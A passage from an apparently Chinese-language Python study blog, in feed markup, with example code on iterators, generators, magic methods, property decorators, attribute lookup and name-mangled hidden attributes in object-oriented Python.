使用迭代器</span><br>my_iterator = MyIterator([<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>, <span class="hljs-number">4</span>, <span class="hljs-number">5</span>])<br><span class="hljs-keyword">for</span> num <span class="hljs-keyword">in</span> my_iterator:<br>    <span class="hljs-built_in">print</span>(num)<br><br><span class="hljs-comment"># 生成器示例</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">my_generator</span>(<span class="hljs-params">data</span>):<br>    <span class="hljs-keyword">for</span> num <span class="hljs-keyword">in</span> data:<br>        <span class="hljs-keyword">yield</span> num<br><br><span class="hljs-comment"># 使用生成器</span><br>my_generator = my_generator([<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>, <span class="hljs-number">4</span>, <span class="hljs-number">5</span>])<br><span class="hljs-keyword">for</span> num <span class="hljs-keyword">in</span> my_generator:<br>    <span class="hljs-built_in">print</span>(num)<br></code></pre></td></tr></table></figure><h2 id="5-10其他魔法方法"><a href="#5-10其他魔法方法" class="headerlink" title="5.10其他魔法方法"></a>5.10其他魔法方法</h2><h3 id="getattribute系列-attribute就是属性的意思"><a href="#getattribute系列-attribute就是属性的意思" class="headerlink" title="getattribute系列 attribute就是属性的意思"></a>getattribute系列 attribute就是属性的意思</h3><ul><li>调用对象不存在的属性的时候，会访问getattr</li><li>访问对象的属性不管存在不存在都会触发getattribute方法</li><li>除非getattribute抛出AttributeError异常才会触发getattr</li><li>所以当你访问对象的属性不管存在不存在都会触发getattribute异常</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Foo</span>:<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self,x</span>):<br>        self.x = x<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__getattr__</span>(<span class="hljs-params">self, item</span>):<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;执行的是我&#x27;</span>)<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__getattribute__</span>(<span class="hljs-params">self, item</span>):<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;不管是否存在,我都会执行&#x27;</span>)<br>        <span class="hljs-keyword">raise</span> AttributeError(<span class="hljs-string">&#x27;哈哈&#x27;</span>)<br><br><br>f1=Foo(<span class="hljs-number">10</span>)<br><br>f1.x<br>f1.y<br></code></pre></td></tr></table></figure><h3 id="module、class、name"><a href="#module、class、name" class="headerlink" title="module、class、name"></a>module、class、name</h3><ul><li><code>__module__</code>：模块，表示当前错爱早的对象在哪个模块</li><li><code>__class__</code>：类 表示当前操作对象的类是什么</li><li><h2 id="name-：-表示当前对象的名字是什么"><a href="#name-：-表示当前对象的名字是什么" class="headerlink" title="__name__： 表示当前对象的名字是什么"></a><code>__name__</code>： 表示当前对象的名字是什么</h2></li></ul><h3 id="slot、all"><a href="#slot、all" class="headerlink" title="slot、all"></a>slot、all</h3><ul><li><code>__slot__</code>：控制对象在实例化后可以持支持哪些属性</li><li>是一个用于限制对象属性的特殊属性，它是一种用于优化内存占用和属性访问速度的机制。通过在类中定义 <code>__slots__</code><br>属性，你可以指定一个属性名称的列表，从而限制类的实例只能具有指定列表中的属性。</li><li>all：</li><li>在模块文件中设置 <code>__all__</code> 变量，当其它文件以“from 模块名 import *”的形式导入该模块时，该文件中只能使用 <code>__all__</code><br>列表中指定的成员。</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># tools.py</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">a: <span class="hljs-built_in">int</span>, b: <span class="hljs-built_in">int</span></span>):<br>    <span class="hljs-keyword">return</span> a + b<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">mul</span>(<span class="hljs-params">a: <span class="hljs-built_in">int</span>, b: <span class="hljs-built_in">int</span></span>):<br>    <span class="hljs-keyword">return</span> a * b<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">xsum</span>(<span class="hljs-params">nums: <span class="hljs-built_in">list</span></span>):<br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">sum</span>(nums)<br><br><br>__all__ = [<span class="hljs-string">&quot;add&quot;</span>, <span class="hljs-string">&quot;mul&quot;</span>]<br></code></pre></td></tr></table></figure><ul><li>第四组：asyncio异步系列的魔法函数（了解）</li></ul>]]></content>
    
    
    <categories>
      
      <category>python</category>
      
    </categories>
    
    
    <tags>
      
      <tag>python</tag>
      
      <tag>笔记</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>【python】进阶之面相对象（四）【重点】</title>
    <link href="/2024/03/18/604python%E8%BF%9B%E9%98%B6%E4%B9%8B%E9%9D%A2%E7%9B%B8%E5%AF%B9%E8%B1%A1%EF%BC%88%E5%9B%9B%EF%BC%89/"/>
    <url>/2024/03/18/604python%E8%BF%9B%E9%98%B6%E4%B9%8B%E9%9D%A2%E7%9B%B8%E5%AF%B9%E8%B1%A1%EF%BC%88%E5%9B%9B%EF%BC%89/</url>
    
    <content type="html"><![CDATA[<h1 id="4-面相对象【重中之中】"><a href="#4-面相对象【重中之中】" class="headerlink" title="4 面相对象【重中之中】"></a>4 面相对象【重中之中】</h1><p>面向对象不是什么语法关键字，也不是什么函数方法，</p><p><strong>而是一种思想，具备这种思想，才能写Python，</strong></p><p><strong>换言之：</strong></p><p><strong>如果不具备这种思想，就写不好Python !!!</strong></p><p><strong>如果不具备这种思想，就写不好Python !!!</strong></p><p><strong>如果不具备这种思想，就写不好Python !!!</strong></p><p>通过本文可以对Python 面向对象有写启蒙，但是具体要根据项目实际场景应用才能深刻体会。</p><h2 id="4-1-一切皆对象【重点】"><a href="#4-1-一切皆对象【重点】" class="headerlink" title="4.1 一切皆对象【重点】"></a>4.1 一切皆对象【重点】</h2><ul><li>Python是一门<code>面向对象</code>语言</li><li>Python中一切皆对象</li><li>无法深刻理解<code>面向对象</code>就无法用好Python</li><li>自定义的类实例化对象，其实像基本数据类型(int\string\list\dict等)、函数、类都是对象，都可以按照对象的方式来操作。</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># 自定义Student类 并实例化对象jack</span><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Student</span>:<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self, name, age</span>):<br>        self.name = name<br>        self.age = age<br> <br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">say_hello</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;My name is <span class="hljs-subst">&#123;self.name&#125;</span>&quot;</span>)<br>        <br>        <br>jack = Student(<span class="hljs-string">&quot;jack&quot;</span>, <span class="hljs-number">18</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">type</span>(jack))<span class="hljs-comment">#使用type查看变量类型 &lt;class &#x27;__main__.Student&#x27;&gt;</span><br>jack.say_hello()<br><span class="hljs-built_in">print</span>(jack.age)<br><br><br><br><span class="hljs-comment"># 普通变量也都是对应类的实例化对象，比如列表变量可以使用 pop()、append()等方法。</span><br>ll = []     <span class="hljs-comment"># 等价于 ll = list()， list就是python 内置类</span><br>ll.append(<span class="hljs-number">123</span>)<br><br><br><span class="hljs-comment"># 函数也是</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">foo</span>():<br>    <span class="hljs-keyword">pass</span><br><br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">type</span>(foo))<span class="hljs-comment">#函数foo是function的实例化对象 &lt;class &#x27;function&#x27;&gt;</span><br></code></pre></td></tr></table></figure><ul><li><code>type</code>查看对象类型</li><li><strong>通过dir函数查看对象下面有哪些属性和方法</strong></li><li>通过id()查看变量的内存地址</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs python">num1 = <span class="hljs-number">400</span><br>num2 = <span class="hljs-number">500</span><br><br><span class="hljs-built_in">print</span>(num1 <span class="hljs-keyword">is</span> num2)<span class="hljs-comment"># False, 内存地址不一样，开辟两块不同的内存地址</span><br>n1 = <span class="hljs-number">100</span><br>n2 = <span class="hljs-number">100</span><br><span class="hljs-built_in">print</span>(n1 <span class="hljs-keyword">is</span> n2)<span class="hljs-comment"># True, 小整数池优化，通用一块内存地址。</span><br><br>stu1 = Student(<span class="hljs-string">&quot;jack&quot;</span>, <span class="hljs-number">18</span>)<br>stu2 = Student(<span class="hljs-string">&quot;jack&quot;</span>, <span class="hljs-number">18</span>)<br><span class="hljs-built_in">print</span>(stu1 <span class="hljs-keyword">is</span> stu2)<span class="hljs-comment"># False, 内存地址不一样，实例化对象都开辟一块新的内存地址。</span><br></code></pre></td></tr></table></figure><h2 id="4-2-面向对象的封装思想【重点】"><a href="#4-2-面向对象的封装思想【重点】" class="headerlink" title="4.2 面向对象的封装思想【重点】"></a>4.2 面向对象的封装思想【重点】</h2><ul><li>基本数据类型int&#x2F;str&#x2F;bool的功能单一，于是有了容器型数据类型list&#x2F;tuple&#x2F;dict&#x2F;set等</li><li>独立的代码块使用起来冗余，于是又了函数，便于特定功能代码块的组织管理、重复使用</li><li>面向对象：将程序进一步整合，对象封装了数据属性和方法属性（数据和功能）即对象也是“容器”</li><li>进一步，许多同类型的对象，是不是也被<code>抽象</code>成了类，所以类也是<code>“容器”</code>，封装了同类型对象共有的数据和功能，可以重复使用</li></ul><h2 id="4-3-绑定方法和非绑定方法【有用】"><a href="#4-3-绑定方法和非绑定方法【有用】" class="headerlink" title="4.3 绑定方法和非绑定方法【有用】"></a>4.3 绑定方法和非绑定方法【有用】</h2><ul><li>python中，类内部定义的函数分为两大类：绑定方法和非绑定方法</li><li>绑定方法有两个：绑定给对象的方法，绑定给类的方法；绑定给谁的方法，谁在调用的时候就不用传第一个参数，比如说self就是绑定给对象的方法，实例化对象调用的时候就不用传第一个参，cls就是绑定给类的方法，类使用的时候就不需要传第一个参</li><li>非绑定方法：类型普通函数，谁都可以使用，遵循普通函数的传参，目的只是为了封装在一起，如：静态方法。就是谁都可以调用且调用的时候不需要传第一个参</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Student</span>():<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self,name,age</span>):<br>        self.name=name<br>        self.age=age<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">edit_name</span>(<span class="hljs-params">self,new_name</span>):<br>        self.name = new_name<br><span class="hljs-meta">    @classmethod</span><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">get_student</span>(<span class="hljs-params">cls,name,age</span>):<br>        <span class="hljs-keyword">return</span> cls(name,age)  <span class="hljs-comment"># 相当于Student(name,age)</span><br><span class="hljs-meta">    @staticmethod</span><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">a,b</span>):<br>        <span class="hljs-keyword">return</span> a+b  <span class="hljs-comment"># 这个方法没有用的类的任何属性方法，是一个静态方法，加装饰器</span><br></code></pre></td></tr></table></figure><h2 id="4-4-类装饰器property【了解】"><a href="#4-4-类装饰器property【了解】" class="headerlink" title="4.4 类装饰器property【了解】"></a>4.4 类装饰器property【了解】</h2><p>python中的property就是一个类装饰器，有两个用途：</p><ul><li>用途一：将函数属性伪装成数据属性</li><li>用途二：统一数据属性的查、改、删除操作【把数据转成对象去操作】</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># 用途一:</span><br><span class="hljs-comment"># 类中的某个数据值，其实是通过拿到类中的某个属性然后计算出来的值，</span><br><span class="hljs-comment"># 但是用户不想通过类的方法去拿到这个值，那就加上property装饰器 </span><br><span class="hljs-comment"># 然后就可以通过类似于对象.属性值的方式来通过对象.方法名这种方式拿到这个值</span><br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">People</span>():<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self,name,w,h</span>):<br>        self.__name=name<br>        self.w=w<br>        self.h=h<br>    <br><span class="hljs-meta">    @property</span><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">bmi</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-keyword">return</span> self.w / (self.h**<span class="hljs-number">2</span>)<br>obj1 = People(<span class="hljs-string">&#x27;jack&#x27;</span>，<span class="hljs-number">66</span>,<span class="hljs-number">1.75</span>)<br><span class="hljs-built_in">print</span>(obj1.bmi)<br><br></code></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># 用途二：在修改和删除时做逻辑判断</span><br><span class="hljs-comment"># 当name 遇到查询时，触发被property装饰的函数的执行，</span><br><span class="hljs-comment"># 当name 遇到赋值操作，即 = 时触发被property.setter装饰的函数的执行</span><br><span class="hljs-comment"># 当name 遇到删除操作，即 del  时触发property.deleter装饰的函数的执行</span><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Poeple</span>:<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self, name, w, h</span>):<br>        self.__name = name<br>        self.w = w<br>        self.h = h<br><br><span class="hljs-meta">    @property</span><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">name</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-keyword">return</span> self.__name<br><br><span class="hljs-meta">    @name.setter </span><span class="hljs-comment"># 修改属性的装饰器，当出发修改时，就会调用这个方法</span><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">name</span>(<span class="hljs-params">self, value</span>):<br>        <span class="hljs-keyword">if</span> <span class="hljs-built_in">type</span>(value) <span class="hljs-keyword">is</span> <span class="hljs-keyword">not</span> <span class="hljs-built_in">str</span>:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;必须传入str类型&#x27;</span>)<br>            <span class="hljs-keyword">return</span><br>        self.__name = value<br><br><span class="hljs-meta">    @name.deleter </span><span class="hljs-comment"># 删除属性的装饰器，当del删除某个属性的时候，触发这个方法</span><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">name</span>(<span class="hljs-params">self</span>): <br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;不能删&#x27;</span>)<br><br><br>obj1 = Poeple(<span class="hljs-string">&#x27;jack&#x27;</span>, <span class="hljs-number">66</span>, <span class="hljs-number">1.75</span>)<br><span class="hljs-built_in">print</span>(obj1.name)<br>obj1.name = <span class="hljs-string">&#x27;aaa&#x27;</span><br><span class="hljs-keyword">del</span> obj1.name<br></code></pre></td></tr></table></figure><h2 id="4-5-cached-property【了解】"><a href="#4-5-cached-property【了解】" class="headerlink" title="4.5 cached_property【了解】"></a>4.5 cached_property【了解】</h2><ul><li>将一个类方法转换为特征属性，一次性计算该特征属性的值，然后将其缓存为实例生命周期内的普通属性。</li><li>类似于对 <code>property</code> 但增加了缓存功能。对于不可变的高计算资源消耗的实例特征属性来说该函数非常有用</li><li>内置包functools下面的类装饰器cached_property</li></ul><p><em><code>cached_property</code> 是一个 Python 装饰器，它可以用于定义一个缓存的属性，这意味着属性的值在第一次访问后会被计算，并将结果缓存起来，后续的访问会直接返回缓存的值，从而避免重复计算。</em></p><p><em><code>cached_property</code> 装饰器可以在需要计算代价较高的属性时使用，以提高性能和效率。</em></p><p><em>在使用 <code>cached_property</code> 装饰器之前，你需要先安装一个名为 <code>cached-property</code> 的第三方库，它提供了这个装饰器的实现。</em></p><p><em>这个用的少</em></p><h2 id="4-6-属性查找顺序【了解】"><a href="#4-6-属性查找顺序【了解】" class="headerlink" title="4.6 属性查找顺序【了解】"></a>4.6 属性查找顺序【了解】</h2><p>属性或者方法的查找顺序的原则</p><ul><li>先从<strong>对象</strong>自身身上找，有则使用；没有的话，再从<strong>类</strong>上找，有则使用；类上也没有的话就报错则报错AttributeError</li></ul><p>示例1：查看对象或类有哪些属性或方法可以使用。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Student</span>:<br>    school = <span class="hljs-string">&#x27;PKU&#x27;</span><span class="hljs-comment"># 类属性</span><br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self, name, age, gender</span>):<br>        self.name = name<br>        self.age = age<br>        self.gender = gender<br>        self.course = <span class="hljs-literal">None</span><br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">get_info</span>(<span class="hljs-params">self</span>):<span class="hljs-comment"># 绑定给对象的方法</span><br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;学生信息：名字：%s 年龄：%s 性别：%s&#x27;</span> % (<br>            self.name,<br>            self.age,<br>            self.gender<br>        ))<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">select_course</span>(<span class="hljs-params">self, new_class</span>):<span class="hljs-comment"># 绑定给对象的方法</span><br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;正在选课&#x27;</span>)<br>        self.course = new_class<br><br><br><span class="hljs-built_in">print</span>(Student.__dict__)<span class="hljs-comment"># 查看类下的属性和方法</span><br><span class="hljs-built_in">print</span>(Student.school)<span class="hljs-comment"># .的方式访问类属性/方法。本质是 Student.__dict__[&quot;school&quot;]</span><br><span class="hljs-built_in">print</span>(Student.get_info)<br><span class="hljs-built_in">print</span>(Student.__dict__[<span class="hljs-string">&quot;school&quot;</span>]) <span class="hljs-comment"># 访问类属性/方法</span><br><span class="hljs-built_in">print</span>(Student.__dict__[<span class="hljs-string">&quot;get_info&quot;</span>])<br><br><br>stu1 = Student(<span class="hljs-string">&quot;jack&quot;</span>, <span class="hljs-number">18</span>, <span class="hljs-string">&quot;男&quot;</span>)<br><span class="hljs-built_in">print</span>(stu1.name)<br><span class="hljs-built_in">print</span>(stu1.get_info)<br><span class="hljs-built_in">print</span>(stu1.__dict__)<span class="hljs-comment">#  访问对象的属性</span><br>stu1.haha = <span class="hljs-string">&quot;123&quot;</span>    <span class="hljs-comment"># 增加一个数据属性</span><br>stu1.add = <span class="hljs-keyword">lambda</span> x: <span class="hljs-built_in">print</span>(x) <span class="hljs-comment"># 增加一个普通函数属性，不是对象的绑定方法哦</span><br></code></pre></td></tr></table></figure><h2 id="4-7-隐藏属性【有用】"><a href="#4-7-隐藏属性【有用】" class="headerlink" title="4.7 隐藏属性【有用】"></a>4.7 隐藏属性【有用】</h2><ul><li>如果类的设计者不想某些属性被访问，就可以将该属性给隐藏起来。</li><li>隐藏属性可以隐藏类中的公有属性和对象的私有属性，对象访问会报错，</li><li>实现方法：使用双下划线开头命名的属性将会被隐藏</li><li>另：单下划线开头的属性和方法类似于保护属性，类内可以访问，类外也可以访问但不会提示</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">class</span> <span class="hljs-title class_">MyClass</span>:<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self</span>):<br>        self.public_attr = <span class="hljs-number">42</span><br>        self._protected_attr = <span class="hljs-number">23</span><br>        self.__private_attr = <span class="hljs-string">&quot;secret&quot;</span><br><br>obj = MyClass()<br><br><span class="hljs-built_in">print</span>(obj.public_attr)  <span class="hljs-comment"># 可以直接访问</span><br><span class="hljs-built_in">print</span>(obj._protected_attr)  <span class="hljs-comment"># 可以直接访问，但是视为受保护</span><br><span class="hljs-comment"># print(obj.__private_attr)  # 不能直接访问，会报错</span><br><br><span class="hljs-built_in">print</span>(obj._MyClass__private_attr)  <span class="hljs-comment"># 使用名称修饰的方式访问私有属性</span><br><br></code></pre></td></tr></table></figure><p>示例2：在类外部无法直接访问双下滑线开头的属性，在类内部可以访问到</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Foo</span>:<br>    ...<br>    <br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__f1</span>(<span class="hljs-params">self</span>):     <span class="hljs-comment"># 隐藏对象的私有绑定函数</span><br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;from test&#x27;</span>)<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">f2</span>(<span class="hljs-params">self</span>):       <span class="hljs-comment"># f2没有被隐藏，可以被访问到</span><br>        <span class="hljs-built_in">print</span>(self.age)<br>        <span class="hljs-built_in">print</span>(self.__name)<br>        self.__f1()<br><br>        <br>obj = Foo(<span class="hljs-string">&#x27;jack&#x27;</span>, <span class="hljs-number">18</span>)<br>obj.f2()<span class="hljs-comment"># 不会报错，可以访问 __name, __f1</span><br></code></pre></td></tr></table></figure><p>示例3：在类定义阶段，双下划先开头的属性会发生变形</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># 在类定义阶段，双下划先开头的属性会发生变形，变为 _Foo__x, _Foo__f1, _Foo__name, 所以在在类外无法直接通过过 .__x 的方式访问。</span><br><span class="hljs-comment"># 但是可以通过变形后的 _Foo__x访问。但这是没有意义的。</span><br><span class="hljs-comment"># 所以说这种操作并没有严格意义上地限制外部访问，仅仅只是一种语法意义上的变形。</span><br><span class="hljs-comment"># 类似的，python中开发人员一般通过约定的方式，任务_开头的变量是内部使用的变量，__开头的变量是被保护的变量。</span><br></code></pre></td></tr></table></figure><p>示例4：只在定义阶段发生形变</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># 之所以在类内部可以直接通过__x 访问，是因为__开头的属性会在检查类体代码语法时统一发生变形（类定义阶段）</span><br><span class="hljs-comment"># 这种变形操作只在检查类体语法的时候发生一次，之后再定义的__开头的属性都不会变形，所以可以直接__y访问到</span><br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Foo</span>:<br>    __x = <span class="hljs-number">1</span>             <span class="hljs-comment"># 隐藏类的公有数据属性</span><br>    ...<br><br><br>Foo.__y = <span class="hljs-number">2</span><span class="hljs-comment"># 增加类Foo的数据属性</span><br><span class="hljs-built_in">print</span>(Foo.__y)<span class="hljs-comment"># 可以访问到</span><br></code></pre></td></tr></table></figure><h2 id="4-8-开发接口【了解】"><a href="#4-8-开发接口【了解】" class="headerlink" title="4.8 开发接口【了解】"></a>4.8 开发接口【了解】</h2><ul><li>定义属性的目的是为了被使用，所以隐藏属性的目的不是单纯的隐藏，隐藏式为了更好的使用。</li><li>想要这些属性被使用，那就必须提供一个对外的接口，（没有被隐藏的属性）</li><li>隐藏数据属性：<strong>将数据隐藏起来就限制了类外部对类内数据的直接操作，然后类内应该提供相应的接口（函数方法）来允许外部间接的操作数据，接口之上呢可以附加额外的逻辑来对数据的操作进行严格的判断，比如说加上各种 if 啊，如果不符合就raise抛出异常</strong></li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Student</span>:<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self, name</span>):<br>        self.__name = name<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">get_name</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-built_in">print</span>(self.__name)  <span class="hljs-comment"># 通过该接口就可以间接地访问到名字属性</span><br>    <br><span class="hljs-meta">    @property</span><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">name</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-keyword">return</span> self.__name<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">set_name</span>(<span class="hljs-params">self, new_name</span>):<br>        <span class="hljs-comment"># 通过改接口判断用户修改的新名字是否合法；非法则修改，不合法就不修改</span><br>        <span class="hljs-keyword">if</span> <span class="hljs-built_in">type</span>(new_name) <span class="hljs-keyword">is</span> <span class="hljs-keyword">not</span> <span class="hljs-built_in">str</span>:<br>            <span class="hljs-keyword">raise</span> TypeError(<span class="hljs-string">&quot;名字必须是字符串类型&quot;</span>)<br>        self.__name = new_name<br><br><br>stu = Student(<span class="hljs-string">&quot;jack&quot;</span>)<br>stu.set_name(<span class="hljs-string">&quot;111&quot;</span>)<br>stu.get_name()<br><span class="hljs-built_in">print</span>(stu.name)<br></code></pre></td></tr></table></figure><h2 